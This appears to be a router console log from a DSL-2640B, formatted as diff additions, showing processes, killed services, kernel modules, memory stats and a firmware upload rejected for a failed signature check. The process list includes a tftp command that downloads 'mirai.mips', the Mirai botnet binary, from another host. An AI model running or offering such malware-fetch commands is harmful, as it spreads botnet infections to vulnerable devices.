+  681 admin      1624 S   telnetd
+  682 admin      1644 S   telnetd
+  685 admin       288 S   sh -c sh 
+  686 admin       324 S   sh 
+  723 admin       284 S   tftp 192.168.2.20 -g -f mirai.mips 
+  726 admin       288 S   sh -c ps > /var/psList 
+  727 admin       284 R   ps 
+
+TELIN: kill process [pid: 473] [wps_btn]...
+
+TELIN: kill process [pid: 520] [snmp]...
+
+TELIN: kill process [pid: 529] [tr64]...
+
+TELIN: kill process [pid: 557] [pppd]...
+
+TELIN: kill process [pid: 685] [sh]...
+
+TELIN: > 
+TELIN: kill process [pid: 686] [sh]...
+
+TELIN: kill process [pid: 551]...
+
+TELIN: 
+Remaining modules:
+TELIN: 
+
+TELIN: ip_conntrack_httpfilter 17424 0 - Live 0xc00e3000
+ipt_state 544 0 - Live 0xc00e2000
+iptable_raw 544 0 - Live 0xc00e0000
+ipt_NOTRACK 672 0 - Live 0xc00df000
+ipt_dscp 448 0 - Live 0xc00de000
+ip_nat_sip 10704 0 - Live 0xc00d7000
+ip_queue 10592 0 - Live 0xc00ca000
+ip_conntrack_sip 10336 1 ip_nat_sip, Live 0xc00cf000
+iptable_nat 15632 2 ip_nat_sip,ip_queue, Live 0xc0053000
+ip_conntrack 30464 6 ipt_state,ipt_NOTRACK,ip_nat_sip,ip_queue,ip_conntrack_sip,iptable_nat, Live 0xc0018000
+ip_tables 14848 6 ipt_state,iptable_raw,ipt_NOTRACK,ipt_dscp,ip_queue,iptable_nat, Live 0xc0006000
+wl 515824 0 - Live 0xc013b000
+bcm_enet 29744 0 - Live 0xc0043000
+bcmprocfs 14624 0 - Live 0xc000c000
+br2684 69440 0 - Live 0xc0032000
+blaa_dd 7104 0 - Live 0xc000a000
+adsldd 141408 0 - Live 0xc0062000
+atmapi 64896 4 bcm_enet,br2684,blaa_dd,adsldd, Live 0xc0022000
+
+TELIN: 
+Memory info:
+
+TELIN: Number of processes: 20
+
+TELIN:  12:24am  up 24 min, 
+load average: 1 min:0.35, 5 min:0.11, 15 min:0.06
+              total         used         free       shared      buffers
+  Mem:        14180        12596         1584            0         1100
+ Swap:            0            0            0
+Total:        14180        12596         1584
+
+TELIN: ... done bcmUploadPrepare
+
+TELIN: 
+Not regular image file
+Allocating 4194324 bytes for flash image.
+Memory allocated
+
+TELIN: Total image size: 79804
+
+TELIN: Not regular image file
+
+TELIN: Digital Signature check Fail!: @, DSL-2640B Max Length:19
+
+TELIN: Tftp Image failed: Illegal image.
+
+[FD13] Timed out
+[FD13] Shut down connection
